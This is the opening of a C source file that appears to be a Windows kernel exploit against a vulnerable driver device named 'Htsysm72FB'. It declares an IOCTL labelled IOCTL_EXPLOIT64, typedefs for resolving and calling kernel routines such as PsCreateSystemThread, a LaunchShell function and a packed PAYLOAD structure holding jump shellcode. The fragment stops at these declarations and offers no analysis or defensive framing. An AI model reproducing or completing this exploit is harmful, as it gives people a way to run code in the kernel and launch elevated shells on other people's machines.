#include <Windows.h>
#include <stdio.h>
#include <intrin.h>
#include <Winternl.h>

#define DEVICE_NAME L"\\\\.\\Htsysm72FB"
#define IOCTL_EXPLOIT64 0xaa013044

#define DECLARE_UNICODE_STRING(_var, _string) \
	WCHAR _var ## _buffer[] = _string; \
	__pragma(warning(push)) \
	__pragma(warning(disable:4221)) __pragma(warning(disable:4204)) \
	UNICODE_STRING _var = { sizeof(_string)-sizeof(WCHAR), sizeof(_string), (PWCH)_var ## _buffer } \
	__pragma(warning(pop))

typedef PVOID(NTAPI * MMGETSYSTEMROUTINEADDRESS)(_In_ PUNICODE_STRING SystemRoutineName);
typedef PVOID(NTAPI * EXALLOCATEPOOLWITHTAG)(_In_ ULONG PoolType, _In_ SIZE_T NumberOfBytes, _In_ ULONG Tag);
typedef NTSTATUS(NTAPI * PSCREATESYSTEMTHREAD)(_Out_ PHANDLE ThreadHandle, _In_ ULONG DesiredAccess, _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_opt_ HANDLE ProcessHandle, _Out_opt_ LPVOID ClientId, _In_ LPVOID StartRoutine, _In_opt_ PVOID StartContext);
VOID LaunchShell(LPVOID arg);

#pragma pack(1) 
typedef struct _PAYLOAD
{
	LPVOID ptr;
	struct SHELLCODE
	{
		USHORT mov;
		LPVOID jmpAddr;
		USHORT jmp;
	} shellcode;
} PAYLOAD, *PPAYLOAD;